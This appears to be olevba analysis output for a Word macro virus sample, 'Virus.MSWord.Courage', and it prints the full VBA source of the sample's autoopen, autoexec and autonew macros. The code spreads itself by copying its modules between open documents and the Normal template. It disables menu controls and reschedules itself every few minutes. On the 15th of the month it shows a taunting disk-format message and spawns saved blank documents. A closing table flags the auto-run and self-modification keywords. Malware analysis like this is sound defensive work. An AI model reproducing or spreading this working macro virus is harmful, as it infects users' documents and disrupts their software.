olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Courage
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Courage - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Courage - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()


Dim normal_exist As Integer
Dim file_exist As Integer
Dim name_myfile As String
Dim path_myfile As String
Dim myfile As String
Dim path_normal As String
Dim name_normal As String
Dim normall As String
Dim dat As String
normal_exist = 0
file_exist = 0
On Error GoTo bye
dat = Day(Date)
If dat = 15 Then
b = MsgBox("½ñÌìÊÇ" + Str(Date) + "£¬ÎÒµÄ²¡¶¾·¢×÷ÁË¡£ÇëÎÊÄãÏë²»Ïë¸ñÊ½»¯ÄãµÄÓ²ÅÌ£¿", vbOKCancel, "·Ç³£ÒÅº¶£¬ÄãµÄ¼ÆËã»úÈ¾ÉÏ²¡¶¾ÁË¡£")
If b = vbOK Then
MsgBox "ÎÒ·Ç³£Åå·þÄãµÄÓÂÆø£¬Çë¼ÌÐø¹¤×÷°É¡£"
Else
MsgBox "Çë°´ÏÂÈ·¶¨¼ü£¬¸ñÊ½»¯ÄúµÄÓ²ÅÌ"
For i = 3 To 10
Documents.Add
ActiveDocument.SaveAs
Next i
End If
End If


CommandBars("tools").Controls(12).Enabled = False
CommandBars("tools").Controls(14).Enabled = False
CommandBars("tools").Controls(13).Enabled = False
CommandBars("view").Controls(6).Enabled = False

path_normal = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
path_myfile = ActiveDocument.Path
name_normal = NormalTemplate
normall = path_normal + "\" + name_normal
name_myfile = ActiveDocument.Name
myfile = path_myfile + "\" + name_myfile

all = ActiveDocument.VBProject.VBComponents.count
For i = 1 To all
If ActiveDocument.VBProject.VBComponents.Item(i).Name = "autoexec" Then
file_exist = 1
End If
Next i


If file_exist = 0 Then

For Each Item In ActiveDocument.VBProject.VBComponents
temp = Item.Name
If temp = "autoopen" Then

Application.OrganizerDelete myfile, "autoopen", wdOrganizerObjectProjectItems
End If
If temp = "autonew" Then
Application.OrganizerDelete myfile, "autonew", wdOrganizerObjectProjectItems
End If
Next

Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems
 ActiveDocument.Save
End If

all = NormalTemplate.VBProject.VBComponents.count
For i = 1 To all
If NormalTemplate.VBProject.VBComponents.Item(i).Name = "autoexec" Then
normal_exist = 1
End If
Next i

If normal_exist = 0 Then

For Each Item In NormalTemplate.VBProject.VBComponents
temp = Item.Name
If temp = "autoopen" Then

Application.OrganizerDelete normall, "autoopen", wdOrganizerObjectProjectItems
End If
If temp = "autonew" Then
Application.OrganizerDelete normall, "autonew", wdOrganizerObjectProjectItems
End If
Next

Application.OrganizerCopy Source:=myfile, Destination:=normall, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=myfile, Destination:=normall, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=myfile, Destination:=normall, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save

End If


bye:




End Sub
  










-------------------------------------------------------------------------------
VBA MACRO autoexec.bas 
in file: Virus.MSWord.Courage - OLE stream: 'Macros/VBA/autoexec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()


Dim temp As String
Dim i As Integer
Dim ii As Integer
Dim normal_exist As Integer
Dim file_exist As Integer
Dim name_myfile As String
Dim path_myfile As String
Dim myfile As String
Dim path_normal As String
Dim name_normal As String
Dim normall As String
Dim dat As String
Dim b As Long
normal_exist = 0
file_exist = 0
b = 99


On Error GoTo bye
If Documents.count = 0 Then
GoTo bye
End If


path_normal = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
name_normal = NormalTemplate
normall = path_normal + "\" + name_normal

all_d = Documents.count
For i = 1 To all_d
path_myfile = Documents(i).Path
name_myfile = Documents(i).Name
If path_myfile <> "" Then
myfile = path_myfile + "\" + name_myfile
Else
myfile = name_myfile
End If
'
all = Documents(i).VBProject.VBComponents.count
For ii = 1 To all
If Documents(i).VBProject.VBComponents.Item(ii).Name = "autoexec" Then
file_exist = 1
End If
Next ii
If file_exist = 0 Then
For Each Item In Documents(i).VBProject.VBComponents
temp = Item.Name
If temp = "autoopen" Then

Application.OrganizerDelete myfile, "autoopen", wdOrganizerObjectProjectItems
End If
If temp = "autonew" Then
Application.OrganizerDelete myfile, "autonew", wdOrganizerObjectProjectItems
End If
Next
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
            
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
            

Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems
If myfile <> name_myfile Then
 Documents(i).Save
 End If
 
End If
file_exist = 0


Next i








bye:





  











Application.OnTime when:=Now + TimeValue("00:05:30"), Name:="Normal.autoexec.main", Tolerance:=0






End Sub
-------------------------------------------------------------------------------
VBA MACRO autonew.bas 
in file: Virus.MSWord.Courage - OLE stream: 'Macros/VBA/autonew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub main()


Dim normal_exist As Integer
Dim file_exist As Integer
Dim name_myfile As String
Dim path_myfile As String
Dim myfile As String
Dim path_normal As String
Dim name_normal As String
Dim normall As String
normal_exist = 0
file_exist = 0
On Error GoTo bye


path_normal = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
path_myfile = ActiveDocument.Path
name_normal = NormalTemplate
normall = path_normal + "\" + name_normal
name_myfile = ActiveDocument.Name
If path_myfile <> Null Then
myfile = path_file + "\" + name_myfile
Else
myfile = name_myfile
End If






Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoopen", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autonew", _
            Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=normall, Destination:=myfile, Name:="autoexec", _
            Object:=wdOrganizerObjectProjectItems







bye:




End Sub
  














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

